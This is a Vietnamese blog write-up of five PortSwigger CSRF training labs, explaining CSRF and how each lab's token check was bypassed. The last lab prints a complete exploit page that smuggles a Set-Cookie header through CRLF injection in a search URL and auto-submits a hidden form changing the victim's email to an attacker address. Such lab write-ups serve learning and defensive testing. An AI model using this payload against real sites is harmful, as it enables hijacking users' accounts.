<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PortSwigger CSRF Challenge WriteUps | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="PortSwigger CSRF Challenge WriteUpGiới thiệu về CSRF (Cross-Site Request Forgery)Lỗ hổng CSRF là gì : Cross-Site Request Forgery hay còn gọi theo tiếng việt là giả mạo yêu cầu trên nhiều trang, là một">
<meta property="og:type" content="article">
<meta property="og:title" content="PortSwigger CSRF Challenge WriteUps">
<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="PortSwigger CSRF Challenge WriteUpGiới thiệu về CSRF (Cross-Site Request Forgery)Lỗ hổng CSRF là gì : Cross-Site Request Forgery hay còn gọi theo tiếng việt là giả mạo yêu cầu trên nhiều trang, là một">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-11-14T19:34:38.244Z">
<meta property="article:modified_time" content="2025-11-14T18:32:22.114Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="PortSwigger">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PortSwigger CSRF Challenge WriteUps",
  "url": "https://pzhat.github.io/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-11-14T19:34:38.244Z",
  "dateModified": "2025-11-14T18:32:22.114Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PortSwigger CSRF Challenge WriteUps',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PortSwigger CSRF Challenge WriteUps</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PortSwigger CSRF Challenge WriteUps</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-14T18:32:22.114Z" title="Updated 2025-11-15 01:32:22">2025-11-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PortSwigger-CSRF-Challenge-WriteUp"><a href="#PortSwigger-CSRF-Challenge-WriteUp" class="headerlink" title="PortSwigger CSRF Challenge WriteUp"></a>PortSwigger CSRF Challenge WriteUp</h1><h3 id="Gioi-thieu-ve-CSRF-Cross-Site-Request-Forgery"><a href="#Gioi-thieu-ve-CSRF-Cross-Site-Request-Forgery" class="headerlink" title="Giới thiệu về CSRF (Cross-Site Request Forgery)"></a>Giới thiệu về CSRF (Cross-Site Request Forgery)</h3><h4 id="Lo-hong-CSRF-la-gi"><a href="#Lo-hong-CSRF-la-gi" class="headerlink" title="Lỗ hổng CSRF là gì :"></a>Lỗ hổng CSRF là gì :</h4><ul>
<li>Cross-Site Request Forgery hay còn gọi theo tiếng việt là giả mạo yêu cầu trên nhiều trang, là một lỗ hổng bảo mật cho phép attacker lừa người dùng đã được xác thực (đã đăng nhập) thực hiện các hành động không mong muốn trên 1 ứng dụng Web.</li>
<li>Nói đơn giản thì attacker sẽ mượn danh tính và session của một victim để gửi đi một yêu cầu giả mạo đến ứng dụng mà victim không hề hay biết. Nếu ứng dụng dễ bị tấn công, nó sẽ không thể phân biệt được đâu là yêu cầu giả mạo đâu là yêu cầu hợp lệ của victim (User).</li>
</ul>
<h4 id="CSRF-hoat-dong-nhu-the-nao"><a href="#CSRF-hoat-dong-nhu-the-nao" class="headerlink" title="CSRF hoạt động như thế nào :"></a>CSRF hoạt động như thế nào :</h4><ul>
<li>Để thực hiện tấn công CSRF cần có 3 điều kiện bao gồm :<ul>
<li>Hành động quan trọng : Ứng dụng phải có một function (hành động, action) mà attacker muốn thực hiện ví dụ như là đổi mật khẩu, đổi username, đổi email, chuyển tiền,…. Nói chung nó có lợi có attacker là tương hết hay còn gọi là attack surface ngon, nhiều.</li>
<li>Xử lý request dựa trên cookie, session : Application phải chỉ dựa vào cookie của trình duyệt để xác định người dùng đang gửi yêu cầu. Không có cơ chế nào xác minh request.</li>
<li>Không có tham số không thể đoán trước : Các tham số trong yêu cầu thực hiện hành động phải là những giá trị mà attacker có thể đoán trược hoặc là biết trước.</li>
</ul>
</li>
</ul>
<h4 id="Tai-sao-lo-hong-nay-ton-tai"><a href="#Tai-sao-lo-hong-nay-ton-tai" class="headerlink" title="Tại sao lỗ hổng này tồn tại :"></a>Tại sao lỗ hổng này tồn tại :</h4><ul>
<li>Lỗ hổng CSRF tồn tại do sự tin tưởng của ứng dụng web vào các cookie mà trình duyệt tự động gửi kèm theo mỗi yêu cầu. Ứng dụng chỉ kiểm tra “ai” đang gửi yêu cầu (dựa trên cookie session) mà không kiểm tra “ý định” của người dùng có thực sự muốn thực hiện hành động đó hay không.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/ByFpDfMx-x.png" alt="image"></p>
<h3 id="Challenge-WriteUp"><a href="#Challenge-WriteUp" class="headerlink" title="Challenge WriteUp"></a>Challenge WriteUp</h3><h3 id="Lab-CSRF-vulnerability-with-no-defenses"><a href="#Lab-CSRF-vulnerability-with-no-defenses" class="headerlink" title="Lab: CSRF vulnerability with no defenses"></a>Lab: CSRF vulnerability with no defenses</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF.</span><br><span class="line"></span><br><span class="line">To solve the lab, craft some HTML that uses a CSRF attack to change the viewer&#x27;s email address and upload it to your exploit server.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/ByZYdfMxbg.png" alt="image"></p>
<p>Đăng nhập với user được cấp sẵn ở đây ta thấy nó có một chức năng đó là update email mà dựa theo description của lab thì nó muốn ta đổi email của người đọc bài ở đây ta sẽ lợi dụng chức năng update này để làm thử.</p>
<p><img src="https://hackmd.io/_uploads/BJkLFzGg-g.png" alt="image"></p>
<p>Hmm thành công tương tác và thay đổi được email address. Taị đây ta có thể tự viết payload CSRF hoặc có thể tận dụng chức năng tạo payload có sẵn của burp pro ở đây mình sẽ dùng thử chức năng <code>generate CSRF POC</code>.</p>
<p><img src="https://hackmd.io/_uploads/B1mA_hzxWe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1ZlK3flWl.png" alt="image"></p>
<p>Thành công tạo ra payload html bây giờ ta sẽ sửa một tí ở trường value vì email này mình đã tạo trước nên có sẵn sợ nó không exploit được ta đổi sang 1 email mới.</p>
<p><img src="https://hackmd.io/_uploads/rJPBt3Mebx.png" alt="image"></p>
<p>Sau đó paste vào exploit server được cấp sẵn của lab và tiến hành store sau đó gửi đi cho victim và thành công với lab đầu tiên.</p>
<p><img src="https://hackmd.io/_uploads/BJ6vthGeWl.png" alt="image"></p>
<h3 id="Lab-CSRF-where-token-validation-depends-on-request-method"><a href="#Lab-CSRF-where-token-validation-depends-on-request-method" class="headerlink" title="Lab: CSRF where token validation depends on request method"></a>Lab: CSRF where token validation depends on request method</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.</span><br><span class="line"></span><br><span class="line">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&#x27;s email address.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/B1arxTfxbx.png" alt="image"></p>
<p>Vẫn là chức năng update email như cũ những lần này nó có thêm 1 cái param đó là <code>csrf</code> nhưng có vẻ nó không thay đổi nhiều bây giờ ta thử cách ta đã làm ở lab đầu tiên xem như thế nào.</p>
<p><img src="https://hackmd.io/_uploads/H1a3eTGgWx.png" alt="image"></p>
<p>Thử với exploit cũ xem có thành công không, sau một lúc store với delivery đến victim ta thấy rằng exploit server chả trả cái gì về nên có vẻ exploit cũ không còn hiệu quả ở đây.</p>
<p>Ta tiến hành thử thay đổi giá trị trường <code>csrf</code> một chút xem thử kết quả nó sẽ như nào.</p>
<p><img src="https://hackmd.io/_uploads/BJ5bGpMxbg.png" alt="image"></p>
<p>Okay khi thay đổi csrf là bị ăn chửi liền hmm vậy nếu trong trường hợp này ta thay đổi HEADER thì liệu cái trường csrf còn hiệu quả không ta? Test thôi.</p>
<p><img src="https://hackmd.io/_uploads/Sy0NMpGg-l.png" alt="image"></p>
<p>Ô có vẻ như khi thay đổi header thì csrf không còn được áp dụng nữa ở đây với header là GET ta đã không còn bị ăn chửi nữa vậy đây là attack surface cho ta rồi bây giờ tiến hành generate csrf POC thôi.</p>
<p><img src="https://hackmd.io/_uploads/rym3fTzlWe.png" alt="image"></p>
<p>Thay đổi một chút ở email thành email khác tránh lỗi.</p>
<p><img src="https://hackmd.io/_uploads/Bk_Jmazgbg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rywgmpzeZl.png" alt="image"></p>
<p>Store và gửi cho nạn nhân và thành công solve lab này.</p>
<h3 id="Lab-CSRF-where-token-validation-depends-on-token-being-present"><a href="#Lab-CSRF-where-token-validation-depends-on-token-being-present" class="headerlink" title="Lab: CSRF where token validation depends on token being present"></a>Lab: CSRF where token validation depends on token being present</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF.</span><br><span class="line"></span><br><span class="line">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&#x27;s email address.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/SyZcBaflZg.png" alt="image"></p>
<p>Đến với lab 3 thì vẫn là chức năng update email như cũ bây giờ ta tiếp tục bắt request để test từng case một thôi.</p>
<p><img src="https://hackmd.io/_uploads/B1DdUaMlWe.png" alt="image"></p>
<p>Vẫn là request ấy bây giờ thử đổi header như ở lab trước xem thử có còn work không.</p>
<p><img src="https://hackmd.io/_uploads/H122Uazg-l.png" alt="image"></p>
<p>Xong ăn chửi rồi có vẻ như dev đã fix lại bây giờ tìm thử cách khác xem sao. Dựa vào đề lab thì nó kêu dựa theo token vậy ta thử thay đổi token csrf xem thử sao.</p>
<p><img src="https://hackmd.io/_uploads/r1VnP6GgWe.png" alt="image"></p>
<p>Well vẫn bị ăn chửi, bây giờ ta sẽ thử xoá luôn cái trường csrf xem thử nó nói như nào.</p>
<p><img src="https://hackmd.io/_uploads/ry4yOpfg-x.png" alt="image"></p>
<p>Ngon rồi sau khi xoá đi trường csrf thì server trả về 302, có vẻ như anh dev quên sửa lại phải bắt buộc có trường csrf trên mỗi request nên với trường hợp này tuy xoá đi trường csrf token thì ta vẫn có thể thực hiện chức năng như bình thường bây giờ thì lặp lại bước tạo csrf POC như cũ thôi.</p>
<p><img src="https://hackmd.io/_uploads/B1fud6Gebe.png" alt="image"></p>
<p>Quăng cái exploit code vào bên exploit server.</p>
<p><img src="https://hackmd.io/_uploads/HylqO6zxZe.png" alt="image"></p>
<p>Store và gửi cho nạn nhân và ta thành công solve lab thứ 3.</p>
<h3 id="Lab-CSRF-where-token-is-not-tied-to-user-session"><a href="#Lab-CSRF-where-token-is-not-tied-to-user-session" class="headerlink" title="Lab: CSRF where token is not tied to user session"></a>Lab: CSRF where token is not tied to user session</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&#x27;t integrated into the site&#x27;s session handling system.</span><br><span class="line"></span><br><span class="line">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&#x27;s email address.</span><br><span class="line"></span><br><span class="line">You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</span><br><span class="line"></span><br><span class="line">wiener:peter</span><br><span class="line">carlos:montoya</span><br></pre></td></tr></table></figure>

<p>Đến với lab này nó cấp cho ta 2 accounts chưa biết để làm gì thôi thì ta tiến hành tạo 2 tabs để truy cập 2 acc cho nhanh.</p>
<p><img src="https://hackmd.io/_uploads/SJSpuRfxZx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1RaOCzlZg.png" alt="image"></p>
<p>Ở đây thì ta vẫn có chức năng đó là update email như cũ không thay đổi bây giờ ta thử bắt request xem có gì xảy ra.</p>
<p><img src="https://hackmd.io/_uploads/HJkPYAGlZg.png" alt="image"></p>
<p>Sau khi có request mình có thử thay đổi csrf token xem có gì không nhưng kết quả vẫn là ăn chửi bây giờ thử xoá như ở lab trước xem có hiệu quả ở đây không.</p>
<p><img src="https://hackmd.io/_uploads/Hy9cFRze-l.png" alt="image"></p>
<p>Okay có vẻ như anh Dev đã fix đoạn này lại nếu thiếu đi csrf token thì sẽ không thực hiện bất kì chức năng nào, bây giờ ta sẽ check thử luồng xử lý của request nó xảy ra như thế nào.</p>
<p><img src="https://hackmd.io/_uploads/r1hF20zgbe.png" alt="image"></p>
<p>Ở đây ta để ý rằng mỗi lần ta tạo một request là nó sẽ khởi tạo một CSRF token khác và tự gán value vào trong đó hmm vậy nếu ta lợi dụng Token của account khác để gắn cho account kia thì sẽ như nào.</p>
<p><img src="https://hackmd.io/_uploads/rymVTAMgZe.png" alt="image"></p>
<p>Ở đây ta tiến hành tạo một request thay đổi email của user carlos, sau đó ta cũng sẽ tiến hành đổi ở bên user wiener bằng csrf token vừa mới tạo của carlos. Ở đây ta làm từng bước 1 tránh lỗi.</p>
<p><img src="https://hackmd.io/_uploads/SJ1SC0Mg-l.png" alt="image"></p>
<p>Đăng nhập user wiener sau đó note lại CSRF token đã được tạo. Sau đó tạo một tab ẩn danh và tiến hành đăng nhập user carlos sau đó tiến hành thử request update email từ user carlos.</p>
<p><img src="https://hackmd.io/_uploads/B15D1JXg-l.png" alt="image"></p>
<p>Sau khi request phát nữa ta thấy rằng csrf của carlos đã hết hiệu lực bây giờ ta thử đổi sang token mà ta đã note của user wiener.</p>
<p><img src="https://hackmd.io/_uploads/Hk12y1Ql-x.png" alt="image"></p>
<p>Ngon đét luôn server trả về 302 là thực thi thành công rồi vậy là ta đã thành công lợi dụng token của user wiener để thay đổi email của user carlos bây giờ ta sẽ tiến hành repeat lại request của wiener để lấy token mới để tạo payload.</p>
<p><img src="https://hackmd.io/_uploads/HJSMx1Xl-l.png" alt="image"></p>
<p>Có token bây giờ ở request đổi email của user carlos ta lặp lại bước generate csrf POC như mấy lab trước.</p>
<p><img src="https://hackmd.io/_uploads/rkBdgJQeWl.png" alt="image"></p>
<p>Đây là payload hoàn chỉnh sau khi tạo và sửa email cùng với đó là nhét token mới bây giờ ném nó lên exploit server thôi.</p>
<p><img src="https://hackmd.io/_uploads/rk43xJmx-l.png" alt="image"></p>
<p>Vậy là hoàn thành lab này ở lab này đã cho ta biết được cách lợi dụng token của người khác để tấn công.</p>
<h3 id="Lab-CSRF-where-token-is-tied-to-non-session-cookie"><a href="#Lab-CSRF-where-token-is-tied-to-non-session-cookie" class="headerlink" title="Lab: CSRF where token is tied to non-session cookie"></a>Lab: CSRF where token is tied to non-session cookie</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&#x27;t fully integrated into the site&#x27;s session handling system.</span><br><span class="line"></span><br><span class="line">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&#x27;s email address.</span><br><span class="line"></span><br><span class="line">You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</span><br><span class="line"></span><br><span class="line">wiener:peter</span><br><span class="line">carlos:montoya</span><br></pre></td></tr></table></figure>

<p>Vẫn như cũ nó cấp cho ta 2 tài khoản bây giờ vẫn như bài trước ta sẽ đăng nhập wiener trước rồi đăng nhập carlos ở tab ẩn danh sau.</p>
<p><img src="https://hackmd.io/_uploads/S1oxibQxWg.png" alt="image"></p>
<p>Ta vẫn thử lấy CSRF token của wiener như bài trước xem thử cách lab trước có hoạt động nữa không.</p>
<p><img src="https://hackmd.io/_uploads/H1qFoWmeZl.png" alt="image"></p>
<p>Sau khi đăng nhập carlos tôi để ý ở đây còn có trường csrfKey nên có vẻ cách cũ không còn khả thi nữa và tương tự ở user wiener cũng có csrfKey ồh vậy có 2 key ta có thể thử inject cả 2 vào xem kết quả.</p>
<p><img src="https://hackmd.io/_uploads/r10LnZ7lZx.png" alt="image"></p>
<p>Lấy 2 key này ta thử inject vào request change email của carlos xem có trả về 302 không.</p>
<p><img src="https://hackmd.io/_uploads/B1_j2WXgWg.png" alt="image"></p>
<p>Request trả về 302 có vẻ như ngon lành rồi giờ ta sẽ tìm nơi có thể bỏ payload vào.</p>
<p><img src="https://hackmd.io/_uploads/ByC0n-Xxbe.png" alt="image"></p>
<p>Tôi để ý rằng ở đây có một thanh chức năng để search các blog và có vẻ như nó không có lớp filter nào</p>
<p><img src="https://hackmd.io/_uploads/SJSYa-mgbg.png" alt="image"></p>
<p>Ok chuẩn rồi chức năng search khá là bình thường và không có filter bây giờ ta sẽ thử inject vào ngay query <code>search?</code>.</p>
<p><img src="https://hackmd.io/_uploads/S1jPRZmlZg.png" alt="image"></p>
<p>Ở đây tại session của user wiener ta thử inject vào csrfKey của user carlos ta để ý rằng cookie đã được inject thành công và làm thay đổi key vốn có của nó. Sau đó ta sẽ dùng chức năng generate csrf POC và inject thêm đoạn url lúc thực hiện search.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a4900800301408c80a4764300ae0048.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker@evil.com&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ilz8s2nL5dWzDPrAL1BnE1ajXodlMRXr&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://0a4900800301408c80a4764300ae0048.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=JrfQnHRIFju4I8OnsQ9jXaodFOnPIvWX%3b%20SameSite=None&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Payload nó sẽ như thế này.</p>
<p><img src="https://hackmd.io/_uploads/rkjhZzmgZg.png" alt="image"></p>
<p>Thành công pass lab.</p>
